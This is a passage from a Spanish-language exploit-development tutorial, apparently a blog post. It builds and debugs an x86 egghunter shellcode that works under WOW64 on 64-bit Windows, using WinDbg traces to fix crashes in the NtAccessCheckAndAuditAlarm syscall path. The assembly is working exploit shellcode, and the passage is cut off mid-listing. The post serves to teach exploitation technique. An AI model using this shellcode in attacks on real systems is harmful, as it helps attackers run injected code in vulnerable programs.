   +0x02c ThreadLocalStoragePointer : Ptr32 Void
   +0x030 ProcessEnvironmentBlock : Ptr32 _PEB
   +0x034 LastErrorValue   : Uint4B
   +0x038 CountOfOwnedCriticalSections : Uint4B
   +0x03c CsrClientThread  : Ptr32 Void
   +0x040 Win32ThreadInfo  : Ptr32 Void
   +0x044 User32Reserved   : [26] Uint4B
   +0x0ac UserReserved     : [5] Uint4B
   +0x0c0 WOW32Reserved    : Ptr32 Void
   +0x0c4 CurrentLocale    : Uint4B
   +0x0c8 FpSoftwareStatusRegister : Uint4B

</span><span class="ro">0:000:x86> </span><span class="p">dds fs:[0xc0] L1
0053:000000c0  77d87000 wow64cpu!KiFastSystemCall  </span>
</code></pre></div></div><br>

<p class="plain-text">A nuestro codigo agregaremos un <code class="language-plaintext highlighter-rouge">int3</code> para establecer un breakpoint y cambiamos el <code class="language-plaintext highlighter-rouge">int 0x2e</code> por una llamada a <code class="language-plaintext highlighter-rouge">0xc0</code> del segmento <code class="language-plaintext highlighter-rouge">fs</code> que apunta a el TEB</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">global</span><span class="na"> _start

_start</span><span class="p">:
    </span><span class="o">int3
    </span><span class="o">xor </span><span class="mi">edx</span><span class="p">, </span><span class="mi">edx</span><span class="c1">            ; $edx = 0x0

    </span><span class="o">.</span><span class="na">page</span><span class="p">:
        </span><span class="o">or </span><span class="mi">dx</span><span class="p">, </span><span class="mi">0xfff        </span><span class="c1">; get last address in page

    </span><span class="o">.</span><span class="na">find</span><span class="p">:
        </span><span class="o">inc </span><span class="mi">edx             </span><span class="c1">; increase memory counter
        </span><span class="o">push </span><span class="mi">edx            </span><span class="c1">; push value to stack

        </span><span class="o">push </span><span class="mi">0x29           </span><span class="c1">; push NtAccessCheckAndAuditAlarm
        </span><span class="o">pop </span><span class="mi">eax             </span><span class="c1">; $eax = NtAccessCheckAndAuditAlarm

        </span><span class="o">xor </span><span class="mi">ebx</span><span class="p">, </span><span class="mi">ebx        </span><span class="c1">; $ebx = 0x0
        </span><span class="o">mov </span><span class="mi">bl</span><span class="p">, </span><span class="mi">0xc0        </span><span class="c1">; wow64cpu!KiFastSystemCall
        </span><span class="o">call</span><span class="p"> [</span><span class="mi">fs</span><span class="p">:</span><span class="mi">ebx</span><span class="p">]       </span><span class="c1">; syscall

        </span><span class="o">cmp </span><span class="mi">al</span><span class="p">, </span><span class="mi">0x5         </span><span class="c1">; check ACCESS_VIOLATION (0xc0000005)
        
        </span><span class="o">pop </span><span class="mi">edx             </span><span class="c1">; restore edx
        </span><span class="o">jz .</span><span class="na">page            </span><span class="c1">; if zf == 1 -> next page

        </span><span class="o">mov </span><span class="mi">eax</span><span class="p">, </span><span class="mi">0x74303077 </span><span class="c1">; $eax = "w00t"
        </span><span class="o">mov </span><span class="mi">edi</span><span class="p">, </span><span class="mi">edx        </span><span class="c1">; $edi = address

        </span><span class="o">scasd               </span><span class="c1">; cmp eax, [edi]
        </span><span class="o">jnz .</span><span class="na">find           </span><span class="c1">; if zf == 0 -> loop

        </span><span class="o">scasd               </span><span class="c1">; cmp eax, [edi]
        </span><span class="o">jnz .</span><span class="na">find           </span><span class="c1">; if zf == 0 -> loop

        </span><span class="o">jmp </span><span class="mi">edi             </span><span class="c1">; if zf == 1 -> exec</span>
</code></pre></div></div><br>

<p class="plain-text">El <code class="language-plaintext highlighter-rouge">int3</code> en el inicio nos permite ejecutar el <code class="language-plaintext highlighter-rouge">.exe</code> y detenernos antes del egghunter</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
(1cc8.296c): WOW64 breakpoint - code 4000001f (first chance)
First chance exceptions are reported before any exception handling.  
This exception may be expected and handled.
ntdll32!LdrpDoDebuggerBreak+0x2b:
77e48107 cc              int     3
</span><span class="ro">0:000:x86> </span><span class="p">g
(1cc8.296c): WOW64 breakpoint - code 4000001f (first chance)
First chance exceptions are reported before any exception handling.  
This exception may be expected and handled.
egghunter+0x1000:
00c21000 cc              int     3

</span><span class="ro">0:000:x86> </span><span class="p">u eip L14
egghunter+0x1000:
00c21000 cc              int     3
00c21001 31d2            xor     edx,edx
00c21003 6681caff0f      or      dx,0FFFh
00c21008 42              inc     edx
00c21009 52              push    edx
00c2100a 6a29            push    29h
00c2100c 58              pop     eax
00c2100d 31db            xor     ebx,ebx
00c2100f b3c0            mov     bl,0C0h
00c21011 64ff13          call    dword ptr fs:[ebx]
00c21014 3c05            cmp     al,5
00c21016 5a              pop     edx
00c21017 74ea            je      egghunter+0x1003 (00c21003)
00c21019 b877303074      mov     eax,74303077h
00c2101e 89d7            mov     edi,edx
00c21020 af              scas    dword ptr es:[edi]
00c21021 75e5            jne     egghunter+0x1008 (00c21008)
00c21023 af              scas    dword ptr es:[edi]
00c21024 75e2            jne     egghunter+0x1008 (00c21008)
00c21026 ffe7            jmp     edi</span>
</code></pre></div></div><br>

<p class="plain-text">El egghunter tal cual como está nos dará un par de problemas asi que analizaremos la función <code class="language-plaintext highlighter-rouge">whNtAccessCheckAndAuditAlarm</code> dentro del contexto de ejecución <code class="language-plaintext highlighter-rouge">wow64</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">u wow64!whNtAccessCheckAndAuditAlarm L10
wow64!whNtAccessCheckAndAuditAlarm:
00007ff8`a7d86d10 48895c2410       mov     qword ptr [rsp+10h],rbx
00007ff8`a7d86d15 4889742418       mov     qword ptr [rsp+18h],rsi
00007ff8`a7d86d1a 57               push    rdi
00007ff8`a7d86d1b 4154             push    r12
00007ff8`a7d86d1d 4155             push    r13
00007ff8`a7d86d1f 4156             push    r14
00007ff8`a7d86d21 4157             push    r15
00007ff8`a7d86d23 4881ecb0000000   sub     rsp,0B0h
00007ff8`a7d86d2a 488b054f840200   mov     rax,qword ptr [wow64!_security_cookie (00007ff8`a7daf180)]  
00007ff8`a7d86d31 4833c4           xor     rax,rsp
00007ff8`a7d86d34 48898424a0000000 mov     qword ptr [rsp+0A0h],rax
00007ff8`a7d86d3c 8b01             mov     eax,dword ptr [rcx]
00007ff8`a7d86d3e 448b4904         mov     r9d,dword ptr [rcx+4]
00007ff8`a7d86d42 8b5108           mov     edx,dword ptr [rcx+8]
00007ff8`a7d86d45 448b410c         mov     r8d,dword ptr [rcx+0Ch]
00007ff8`a7d86d49 448b5110         mov     r10d,dword ptr [rcx+10h]</span>
</code></pre></div></div><br>

<p class="plain-text">Lo que mas destaca de primeras es que mueve a diferentes registros de 32 bits los <code class="language-plaintext highlighter-rouge">dwords</code> dentro del registro <code class="language-plaintext highlighter-rouge">rcx</code>, inspeccionaremos que hay en ese registro</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">mov     eax,dword ptr [rcx]
mov     r9d,dword ptr [rcx+4]
mov     edx,dword ptr [rcx+8]
mov     r8d,dword ptr [rcx+0Ch]
mov     r10d,dword ptr [rcx+10h]</span>
</code></pre></div></div><br>

<p class="plain-text">Vamos a ejecutar el egghunter para detenernos en la llamada a <code class="language-plaintext highlighter-rouge">fs:[0xc0]</code>, en el stack hemos almacenado el valor de la página en <code class="language-plaintext highlighter-rouge">edx</code> y hay algunos punteros más</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000:x86> </span><span class="p">g 0x00c21011
egghunter+0x1011:
00c21011 64ff13          call    dword ptr fs:[ebx]   fs:0053:000000c0=00000000  

</span><span class="ro">0:000:x86> </span><span class="p">dds esp L4
007ffa9c  00001000
007ffaa0  77517ba9 KERNEL32!BaseThreadInitThunk+0x19
007ffaa4  004ed000
007ffaa8  77517b90 KERNEL32!BaseThreadInitThunk

</span><span class="ro">0:000:x86> </span><span class="p">r
eax=00000029 ebx=000000c0 ecx=00c21000 edx=00001000 esi=00c21000 edi=00c21000
eip=00c21011 esp=007ffa9c ebp=007ffaac iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
egghunter+0x1011:
00c21011 64ff13          call    dword ptr fs:[ebx]   fs:0053:000000c0=00000000  </span>
</code></pre></div></div><br>

<p class="plain-text">El primer problema viene en los <code class="language-plaintext highlighter-rouge">movs</code>, guarda en registros los valores de <code class="language-plaintext highlighter-rouge">[rcx]</code> que apunta a <code class="language-plaintext highlighter-rouge">0x007ffaa0</code> que antes del call apuntaba a <code class="language-plaintext highlighter-rouge">esp + 4</code>, edx es uno de los que modifica pero para nosotros es importante que el valor de <code class="language-plaintext highlighter-rouge">edx</code> sea el de la página, la buena noticia es que los valores los saca del stack por lo que podriamos controlarlo, edx ahora vale <code class="language-plaintext highlighter-rouge">0x77517b90</code> que antes de la llamada estaba en <code class="language-plaintext highlighter-rouge">esp + 0xc</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000:x86> </span><span class="p">g wow64!whNtAccessCheckAndAuditAlarm + 0x2c
wow64!whNtAccessCheckAndAuditAlarm+0x2c:
00007ffe`9051601c 8b01            mov     eax,dword ptr [rcx] ds:00000000`007ffaa0=77517ba9

</span><span class="ro">0:000> </span><span class="p">p
wow64!whNtAccessCheckAndAuditAlarm+0x2e:
00007ffe`9051601e 448b4904        mov     r9d,dword ptr [rcx+4] ds:00000000`007ffaa4=004ed000

</span><span class="ro">0:000> </span><span class="p">p
wow64!whNtAccessCheckAndAuditAlarm+0x32:
00007ffe`90516022 8b5108          mov     edx,dword ptr [rcx+8] ds:00000000`007ffaa8=77517b90

</span><span class="ro">0:000> </span><span class="p">p
wow64!whNtAccessCheckAndAuditAlarm+0x35:
00007ffe`90516025 448b410c        mov     r8d,dword ptr [rcx+0Ch] ds:00000000`007ffaac=007ffb04  

</span><span class="ro">0:000> </span><span class="p">r
rax=0000000077517ba9 rbx=00000000004f0000 rcx=00000000007ffaa0
rdx=0000000077517b90 rsi=00007ffe90515ff0 rdi=00000000004ee000
rip=00007ffe90516025 rsp=00000000002fe030 rbp=00000000007ffaac
 r8=0000000000000000  r9=00000000004ed000 r10=00007ffe90544050
r11=00000000007ffaa0 r12=00000000004ee000 r13=00000000002ffda0
r14=00000000004ef498 r15=00000000007ffaa0
iopl=0         nv up ei pl nz na pe nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000202
wow64!whNtAccessCheckAndAuditAlarm+0x35:
00007ffe`90516025 448b410c        mov     r8d,dword ptr [rcx+0Ch] ds:00000000`007ffaac=007ffb04  </span>
</code></pre></div></div><br>

<p class="plain-text">Si a <code class="language-plaintext highlighter-rouge">edx</code> le asigna el valor de <code class="language-plaintext highlighter-rouge">esp + 0xc</code> podemos hacer un <code class="language-plaintext highlighter-rouge">push</code> de 3 dword con valor <code class="language-plaintext highlighter-rouge">0x0</code> y el siguiente push el valor de <code class="language-plaintext highlighter-rouge">edx</code> para que apunte a esa dirección</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    .</span><span class="na">find</span><span class="p">:
        </span><span class="o">inc </span><span class="mi">edx             </span><span class="c1">; increase memory counter
        </span><span class="o">xor </span><span class="mi">ebx</span><span class="p">, </span><span class="mi">ebx        </span><span class="c1">; $ebx = 0x0

        </span><span class="o">push </span><span class="mi">edx            </span><span class="c1">; push value to stack
        </span><span class="o">push </span><span class="mi">ebx            </span><span class="c1">; push 0x0
        </span><span class="o">push </span><span class="mi">ebx            </span><span class="c1">; push 0x0
        </span><span class="o">push </span><span class="mi">ebx            </span><span class="c1">; push 0x0

        </span><span class="o">push </span><span class="mi">0x29           </span><span class="c1">; push NtAccessCheckAndAuditAlarm
        </span><span class="o">pop </span><span class="mi">eax             </span><span class="c1">; $eax = NtAccessCheckAndAuditAlarm  

        </span><span class="o">mov </span><span class="mi">bl</span><span class="p">, </span><span class="mi">0xc0        </span><span class="c1">; wow64cpu!KiFastSystemCall
        </span><span class="o">call </span><span class="p">[</span><span class="mi">fs</span><span class="p">:</span><span class="mi">ebx</span><span class="p">]       </span><span class="c1">; syscall
        </span><span class="o">add </span><span class="mi">esp</span><span class="p">, </span><span class="mi">0xc        </span><span class="c1">; clear stack</span>
</code></pre></div></div><br>

<p class="plain-text">Nuestro egghunter ahora se ve de esta forma, veamos como se comporta esta vez</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">g
(15e4.2e74): WOW64 breakpoint - code 4000001f (first chance)
First chance exceptions are reported before any exception handling.  
This exception may be expected and handled.
ntdll32!LdrpDoDebuggerBreak+0x2b:
77e48107 cc              int     3

</span><span class="ro">0:000:x86> </span><span class="p">g
(15e4.2e74): WOW64 breakpoint - code 4000001f (first chance)
First chance exceptions are reported before any exception handling.  
This exception may be expected and handled.
egghunter+0x1000:
00991000 cc              int     3

</span><span class="ro">0:000:x86> </span><span class="p">u eip L18
egghunter+0x1000:
00991000 cc              int     3
00991001 31d2            xor     edx,edx
00991003 6681caff0f      or      dx,0FFFh
00991008 42              inc     edx
00991009 31db            xor     ebx,ebx
0099100b 52              push    edx
0099100c 53              push    ebx
0099100d 53              push    ebx
0099100e 53              push    ebx
0099100f 6a29            push    29h
00991011 58              pop     eax
00991012 b3c0            mov     bl,0C0h
00991014 64ff13          call    dword ptr fs:[ebx]
00991017 83c40c          add     esp,0Ch
0099101a 3c05            cmp     al,5
0099101c 5a              pop     edx
0099101d 74e4            je      egghunter+0x1003 (00991003)
0099101f b877303074      mov     eax,74303077h
00991024 89d7            mov     edi,edx
00991026 af              scas    dword ptr es:[edi]
00991027 75df            jne     egghunter+0x1008 (00991008)
00991029 af              scas    dword ptr es:[edi]
0099102a 75dc            jne     egghunter+0x1008 (00991008)
0099102c ffe7            jmp     edi</span>
</code></pre></div></div><br>

<p class="plain-text">Antes de hacer la llamada en el stack podemos ver <code class="language-plaintext highlighter-rouge">3</code> dwords con valor <code class="language-plaintext highlighter-rouge">0x0</code> y en la direccion <code class="language-plaintext highlighter-rouge">esp + 0xc</code> se guarda el valor de <code class="language-plaintext highlighter-rouge">edx</code> que apunta a la página actual</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000:x86> </span><span class="p">g 0x00991014
egghunter+0x1014:
00991014 64ff13          call    dword ptr fs:[ebx]   fs:0053:000000c0=00000000  

</span><span class="ro">0:000:x86> </span><span class="p">dds esp L4
005ff930  00000000
005ff934  00000000
005ff938  00000000
005ff93c  00001000</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora al ejecutar las instrucciones <code class="language-plaintext highlighter-rouge">mov</code>, en edx guarda lo que esta en <code class="language-plaintext highlighter-rouge">[rcx+8]</code> que equivale a <code class="language-plaintext highlighter-rouge">esp + 0xc</code> antes del call por lo que <code class="language-plaintext highlighter-rouge">edx</code> vuelve a tener el mismo valor</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000:x86> </span><span class="p">g wow64!whNtAccessCheckAndAuditAlarm + 0x2c
wow64!whNtAccessCheckAndAuditAlarm+0x2c:
00007ffe`9051601c 8b01            mov     eax,dword ptr [rcx] ds:00000000`005ff934=00000000

</span><span class="ro">0:000> </span><span class="p">p
wow64!whNtAccessCheckAndAuditAlarm+0x2e:
00007ffe`9051601e 448b4904        mov     r9d,dword ptr [rcx+4] ds:00000000`005ff938=00000000

</span><span class="ro">0:000> </span><span class="p">p
wow64!whNtAccessCheckAndAuditAlarm+0x32:
00007ffe`90516022 8b5108          mov     edx,dword ptr [rcx+8] ds:00000000`005ff93c=00001000

</span><span class="ro">0:000> </span><span class="p">p
wow64!whNtAccessCheckAndAuditAlarm+0x35:
00007ffe`90516025 448b410c        mov     r8d,dword ptr [rcx+0Ch] ds:00000000`005ff940=77517ba9  </span>
</code></pre></div></div><br>

<p class="plain-text">Esto deberia bastar pero al ejecutar el egghunter y hacer la llamada con una dirección válida como <code class="language-plaintext highlighter-rouge">0x00400000</code> el codigo que devuelve es <code class="language-plaintext highlighter-rouge">0xc0000005</code> como si no existiera</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">p
eax=00000029 ebx=000000c0 ecx=00000000 edx=00400000 esi=00401848 edi=00401848
eip=00e1f941 esp=00e1f9b8 ebp=41414141 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
00e1f941 64ff13          call    dword ptr fs:[ebx]   fs:0053:000000c0=77597000  

</span><span class="ro">0:000> </span><span class="p">p
(1e00.1d5c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=c0000005 ebx=000000c0 ecx=00000000 edx=00000000 esi=00401848 edi=00401848
eip=00e1f944 esp=00e1f9b8 ebp=41414141 iopl=0         nv up ei pl nz na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000206
00e1f944 83c40c          add     esp,0Ch</span>
</code></pre></div></div><br>

<p class="plain-text">Dentro de la función podemos ver que comprueba si <code class="language-plaintext highlighter-rouge">r8d</code> es igual a <code class="language-plaintext highlighter-rouge">0</code> y si es asi hace un salto condicional pero al no ser <code class="language-plaintext highlighter-rouge">0</code> mas adelante intenta mover lo que esta en <code class="language-plaintext highlighter-rouge">[r8 + 4]</code> sin embargo al no existir el programa corrompe y el egghunter no funciona</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000:x86> </span><span class="p">g wow64!whNtAccessCheckAndAuditAlarm + 0xc5
wow64!whNtAccessCheckAndAuditAlarm+0xc5:
00007ff8`a7d86dd5 4585c0          test    r8d,r8d

</span><span class="ro">0:000> </span><span class="p">p
wow64!whNtAccessCheckAndAuditAlarm+0xc8:
00007ff8`a7d86dd8 742f            je      wow64!whNtAccessCheckAndAuditAlarm+0xf9 (00007ff8`a7d86e09) [br=0]  

</span><span class="ro">0:000> </span><span class="p">p
wow64!whNtAccessCheckAndAuditAlarm+0xca:
00007ff8`a7d86dda 488db42490000000 lea     rsi,[rsp+90h]

</span><span class="ro">0:000> </span><span class="p">p
wow64!whNtAccessCheckAndAuditAlarm+0xd2:
00007ff8`a7d86de2 418b4004        mov     eax,dword ptr [r8+4] ds:00000000`ffff60ed=????????

</span><span class="ro">0:000> </span><span class="p">p
(7a4.1114): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
wow64!whNtAccessCheckAndAuditAlarm+0xd2:
00007ff8`a7d86de2 418b4004        mov     eax,dword ptr [r8+4] ds:00000000`ffff60ed=????????</span>
</code></pre></div></div><br>

<p class="plain-text">Podemos solucionando facilmente seteando <code class="language-plaintext highlighter-rouge">r8d</code> a <code class="language-plaintext highlighter-rouge">0</code> para que se produzca el salto y no llegue a esa instrucción, mirando las instrucciones mueve a <code class="language-plaintext highlighter-rouge">r8d</code> lo que este en <code class="language-plaintext highlighter-rouge">[rcx+0xc]</code> que antes de la llamada seria <code class="language-plaintext highlighter-rouge">esp + 0x10</code>, asi que podemos controlarlo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">mov     eax,dword ptr [rcx]
mov     r9d,dword ptr [rcx+4]
mov     edx,dword ptr [rcx+8]
mov     r8d,dword ptr [rcx+0Ch]
mov     r10d,dword ptr [rcx+10h]</span>
</code></pre></div></div><br>

<p class="plain-text">La solución es simple, agregar otro push de <code class="language-plaintext highlighter-rouge">0x0</code> pero esta vez antes del valor de edx, sin embargo despues de la llamada debemos limpiar el stack con un <code class="language-plaintext highlighter-rouge">add esp, 0x4</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    .</span><span class="na">find</span><span class="p">:
        </span><span class="o">inc </span><span class="mi">edx             </span><span class="c1">; increase memory counter
        </span><span class="o">xor </span><span class="mi">ebx</span><span class="p">, </span><span class="mi">ebx        </span><span class="c1">; $ebx = 0x0

        </span><span class="o">push </span><span class="mi">ebx            </span><span class="c1">; push 0x0
        </span><span class="o">push </span><span class="mi">edx            </span><span class="c1">; push value to stack
        </span><span class="o">push </span><span class="mi">ebx            </span><span class="c1">; push 0x0
        </span><span class="o">push </span><span class="mi">ebx            </span><span class="c1">; push 0x0
        </span><span class="o">push </span><span class="mi">ebx            </span><span class="c1">; push 0x0

        </span><span class="o">push </span><span class="mi">0x29           </span><span class="c1">; push NtAccessCheckAndAuditAlarm
        </span><span class="o">pop </span><span class="mi">eax             </span><span class="c1">; $eax = NtAccessCheckAndAuditAlarm  

        </span><span class="o">mov </span><span class="mi">bl</span><span class="p">, </span><span class="mi">0xc0        </span><span class="c1">; wow64cpu!KiFastSystemCall
        </span><span class="o">call </span><span class="p">[</span><span class="mi">fs</span><span class="p">:</span><span class="mi">ebx</span><span class="p">]       </span><span class="c1">; syscall
        </span><span class="o">add </span><span class="mi">esp</span><span class="p">, </span><span class="mi">0xc        </span><span class="c1">; clear stack

        </span><span class="o">pop </span><span class="mi">edx             </span><span class="c1">; restore edx
        </span><span class="o">add </span><span class="mi">esp</span><span class="p">, </span><span class="mi">0x4        </span><span class="c1">; clear stack</span>
</code></pre></div></div><br>

<p class="plain-text">Ahora el salto condicional se cumple ya que <code class="language-plaintext highlighter-rouge">r8d</code> vale 0 por lo que salta mas adelante</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000:x86> </span><span class="p">g wow64!whNtAccessCheckAndAuditAlarm + 0xc5
wow64!whNtAccessCheckAndAuditAlarm+0xc5:
00007ff8`a7d86dd5 4585c0          test    r8d,r8d

</span><span class="ro">0:000> </span><span class="p">p
wow64!whNtAccessCheckAndAuditAlarm+0xc8:
00007ff8`a7d86dd8 742f            je      wow64!whNtAccessCheckAndAuditAlarm+0xf9 (00007ff8`a7d86e09) [br=1]  

</span><span class="ro">0:000> </span><span class="p">p
wow64!whNtAccessCheckAndAuditAlarm+0xf9:
00007ff8`a7d86e09 498bf0          mov     rsi,r8</span>
</code></pre></div></div><br>

<p class="plain-text">Pasamos ese problema pero aun queda otro, dentro de la llamada a una función mueve a <code class="language-plaintext highlighter-rouge">rcx</code> el valor de <code class="language-plaintext highlighter-rouge">r10</code> y mas adelante hay un salto condicional si el valor de <code class="language-plaintext highlighter-rouge">rcx</code> es <code class="language-plaintext highlighter-rouge">0</code> y si no es asi ejecuta una comparación con el contenido dentro de <code class="language-plaintext highlighter-rouge">[rcx+2]</code> con <code class="language-plaintext highlighter-rouge">ax</code> pero al no encontrar la dirección en memoria corrompe</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000> </span><span class="p">p
wow64!whNtAccessCheckAndAuditAlarm+0xfc:
00007ff8`a7d86e0c 498bca          mov     rcx,r10

</span><span class="ro">0:000> </span><span class="p">p
wow64!whNtAccessCheckAndAuditAlarm+0xff:
00007ff8`a7d86e0f e8808bfeff      call    wow64!Wow64ShallowThunkAllocSecurityDescriptor32TO64_FNC (00007ff8`a7d6f994)

</span><span class="ro">0:000> </span><span class="p">t
wow64!Wow64ShallowThunkAllocSecurityDescriptor32TO64_FNC:
00007ff8`a7d6f994 4053            push    rbx

</span><span class="ro">0:000> </span><span class="p">p
wow64!Wow64ShallowThunkAllocSecurityDescriptor32TO64_FNC+0x2:
00007ff8`a7d6f996 4883ec20        sub     rsp,20h

</span><span class="ro">0:000> </span><span class="p">p
wow64!Wow64ShallowThunkAllocSecurityDescriptor32TO64_FNC+0x6:
00007ff8`a7d6f99a 33c0            xor     eax,eax

</span><span class="ro">0:000> </span><span class="p">p
wow64!Wow64ShallowThunkAllocSecurityDescriptor32TO64_FNC+0x8:
00007ff8`a7d6f99c 488bd9          mov     rbx,rcx

</span><span class="ro">0:000> </span><span class="p">p
wow64!Wow64ShallowThunkAllocSecurityDescriptor32TO64_FNC+0xb:
00007ff8`a7d6f99f 4885c9          test    rcx,rcx

</span><span class="ro">0:000> </span><span class="p">p
wow64!Wow64ShallowThunkAllocSecurityDescriptor32TO64_FNC+0xe:
00007ff8`a7d6f9a2 7473            je      wow64!Wow64ShallowThunkAllocSecurityDescriptor32TO64_FNC+0x83 (00007ff8`a7d6fa17) [br=0]  

</span><span class="ro">0:000> </span><span class="p">p
wow64!Wow64ShallowThunkAllocSecurityDescriptor32TO64_FNC+0x10:
00007ff8`a7d6f9a4 66394102        cmp     word ptr [rcx+2],ax ds:00000000`ffff60eb=????

</span><span class="ro">0:000> </span><span class="p">p
(1e40.d8c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
wow64!Wow64ShallowThunkAllocSecurityDescriptor32TO64_FNC+0x10:
00007ff8`a7d6f9a4 66394102        cmp     word ptr [rcx+2],ax ds:00000000`ffff60eb=????</span>
</code></pre></div></div><br>

<p class="plain-text">La solución es igual de sencilla a la anterior ya que el orden nos lo permite, agregamos un push de <code class="language-plaintext highlighter-rouge">0x0</code> al inicio y en lugar de limpiar el stack con <code class="language-plaintext highlighter-rouge">0x4</code> lo hacemos con <code class="language-plaintext highlighter-rouge">0x8</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="o">    .</span><span class="na">find</span><span class="p">:
        </span><span class="o">inc </span><span class="mi">edx</span><span class="c1">             ; increase memory counter
        </span><span class="o">xor </span><span class="mi">ebx</span><span class="p">, </span><span class="mi">ebx        </span><span class="c1">; $ebx = 0x0

        </span><span class="o">push </span><span class="mi">ebx            </span><span class="c1">; push 0x0
        </span><span class="o">push </span><span class="mi">ebx            </span><span class="c1">; push 0x0
        </span><span class="o">push </span><span class="mi">edx            </span><span class="c1">; push value to stack
        </span><span class="o">push </span><span class="mi">ebx            </span><span class="c1">; push 0x0
        </span><span class="o">push </span><span class="mi">ebx            </span><span class="c1">; push 0x0
        </span><span class="o">push </span><span class="mi">ebx            </span><span class="c1">; push 0x0

        </span><span class="o">push </span><span class="mi">0x29           </span><span class="c1">; push NtAccessCheckAndAuditAlarm
        </span><span class="o">pop </span><span class="mi">eax             </span><span class="c1">; $eax = NtAccessCheckAndAuditAlarm

        </span><span class="o">mov </span><span class="mi">bl</span><span class="p">, </span><span class="mi">0xc0        </span><span class="c1">; wow64cpu!KiFastSystemCall
        </span><span class="o">call </span><span class="p">[</span><span class="mi">fs</span><span class="p">:</span><span class="mi">ebx</span><span class="p">]       </span><span class="c1">; syscall
        </span><span class="o">add </span><span class="mi">esp</span><span class="p">, </span><span class="mi">0xc        </span><span class="c1">; clear stack

        </span><span class="o">pop </span><span class="mi">edx             </span><span class="c1">; restore edx
        </span><span class="o">add </span><span class="mi">esp</span><span class="p">, </span><span class="mi">0x8        </span><span class="c1">; clear stack</span>
</code></pre></div></div><br>

<p class="plain-text">Esta vez dentro de la función se cumplirá el salto condicional por lo que no ejecutara la comparación y puede salir de la función sin corromper el programa</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ro">0:000:x86> </span><span class="p">g wow64!whNtAccessCheckAndAuditAlarm + 0xfc
wow64!whNtAccessCheckAndAuditAlarm+0xfc:
00007ff8`a7d86e0c 498bca          mov     rcx,r10

</span><span class="ro">0:000> </span><span class="p">p
wow64!whNtAccessCheckAndAuditAlarm+0xff:
00007ff8`a7d86e0f e8808bfeff      call    wow64!Wow64ShallowThunkAllocSecurityDescriptor32TO64_FNC (00007ff8`a7d6f994)  

</span><span class="ro">0:000> </span><span class="p">p
wow64!whNtAccessCheckAndAuditAlarm+0x104:
00007ff8`a7d86e14 488bfb          mov     rdi,rbx</span>
</code></pre></div></div><br>

<p class="plain-text">Una vez solucionamos los problemas que hacian que devolviera <code class="language-plaintext highlighter-rouge">0xc0000005</code> aunque la página fuera válida el código del egghunter se ve de la siguiente forma, aunque el egghunter es un poco mas grande que el anterior deberia funcionar en sistemas <code class="language-plaintext highlighter-rouge">x64</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="no">global </span><span class="na">_start

_start</span><span class="p">:
    </span><span class="o">xor </span><span class="mi">edx</span><span class="p">, </span><span class="mi">edx            </span><span class="c1">; $edx = 0x0

    </span><span class="o">.</span><span class="na">page</span><span class="p">:
        </span><span class="o">or </span><span class="mi">dx</span><span class="p">, </span><span class="mi">0xfff        </span><span class="c1">; get last address in page

    </span><span class="o">.</span><span class="na">find</span><span class="p">:
        </span><span class="o">inc </span><span class="mi">edx             </span><span class="c1">; increase memory counter
        </span><span class="o">xor </span><span class="mi">ebx</span><span class="p">, </span><span class="mi">ebx        </span><span class="c1">; $ebx = 0x0

        </span><span class="o">push </span><span class="mi">ebx            </span><span class="c1">; push 0x0
        </span><span class="o">push </span><span class="mi">ebx            </span><span class="c1">; push 0x0
        </span><span class="o">push </span><span class="mi">edx            </span><span class="c1">; push value to stack
        </span><span class="o">push </span><span class="mi">ebx            </span><span class="c1">; push 0x0
        </span><span class="o">push </span><span class="mi">ebx            </span><span class="c1">; push 0x0
        </span><span class="o">push </span><span class="mi">ebx            </span><span class="c1">; push 0x0

        </span><span class="o">push </span><span class="mi">0x29           </span><span class="c1">; push NtAccessCheckAndAuditAlarm
        </span><span class="o">pop </span><span class="mi">eax             </span><span class="c1">; $eax = NtAccessCheckAndAuditAlarm

        </span><span class="o">mov </span><span class="mi">bl</span><span class="p">, </span><span class="mi">0xc0        </span><span class="c1">; wow64cpu!KiFastSystemCall
